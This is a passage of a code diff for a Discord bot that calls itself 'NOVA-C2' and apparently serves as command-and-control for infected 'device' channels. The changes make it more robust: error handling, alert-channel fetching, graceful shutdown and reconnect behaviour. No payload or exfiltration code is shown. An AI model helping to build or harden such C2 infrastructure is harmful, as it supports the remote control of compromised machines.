-  for (const [, guild] of client.guilds.cache) {
+  await Promise.allSettled([...client.guilds.cache.values()].map(async guild => {
     startStatusChecker(guild)
-    await registerSlashCommands(guild)
-  }
+    try { await registerSlashCommands(guild) } catch {}
+  }))
 })
 
 client.on(Events.GuildCreate, async (guild) => { startStatusChecker(guild); await registerSlashCommands(guild) })
@@ -1505,24 +1564,26 @@ client.on(Events.GuildDelete, (guild) => {
 })
 client.on(Events.ChannelCreate, async (ch) => {
   if (ch.type === ChannelType.GuildText && ch.name.startsWith('device-')) {
-    deviceStatus.set(ch.id, { online: false, lastSeen: Date.now(), name: ch.name })
+    deviceStatus.set(ch.id, { online: false, lastSeen: null, name: ch.name })
     const alertChId = ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID
     if (alertChId) {
-      const alertCh = client.channels.cache.get(alertChId)
-      if (alertCh) alertCh.send({ embeds: [new EmbedBuilder().setColor(0x00ff88).setTitle(`${E.zap} NEW DEVICE`).setDescription(`**${ch.name.replace('device-', '')}** connected`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` }).setTimestamp()] }).catch(() => {})
+      ;(client.channels.cache.get(alertChId) || await client.channels.fetch(alertChId).catch(() => null))?.send({ embeds: [new EmbedBuilder().setColor(0x00ff88).setTitle(`${E.zap} NEW DEVICE`).setDescription(`**${ch.name.replace('device-', '')}** connected`).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}` }).setTimestamp()] }).catch(() => {})
     }
   }
 })
 
 // ── Graceful shutdown ──────────────────────────────────────────────────
-process.on('SIGINT', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); process.exit(0) })
-process.on('SIGTERM', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); process.exit(0) })
-process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message); process.exit(1) })
-process.on('unhandledRejection', (reason) => { console.error('[FATAL] Unhandled:', reason); process.exit(1) })
+process.on('SIGINT', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); setTimeout(() => process.exit(0), 1000) })
+process.on('SIGTERM', () => { console.log('[*] Shutdown'); for (const id of statusCheckers.values()) clearInterval(id); statusCheckers.clear(); client.destroy(); setTimeout(() => process.exit(0), 1000) })
+process.on('uncaughtException', (err) => { console.error('[FATAL]', err.message) })
+process.on('unhandledRejection', (reason) => { console.error('[!] Unhandled Rejection:', reason?.message || reason) })
 client.on(Events.Warn, (info) => { console.log(`[Gateway] Warn: ${info}`) })
 client.on(Events.Error, (error) => { console.error(`[Gateway] Error: ${error.message}`) })
 client.on(Events.ShardDisconnect, (event) => { console.log(`[Gateway] Disconnected: ${event.code}`) })
 client.on(Events.ShardReconnecting, () => { console.log('[Gateway] Reconnecting...') })
-client.on(Events.ShardResume, (replayed) => { console.log(`[Gateway] Resumed — ${replayed} events`) })
+client.on(Events.ShardResume, (replayed) => {
+  console.log(`[Gateway] Resumed — ${replayed} events`)
+  for (const [, guild] of client.guilds.cache) startStatusChecker(guild)
+})
 
 client.login(DISCORD_TOKEN).catch(err => { console.error('Login failed:', err.message); process.exit(1) })
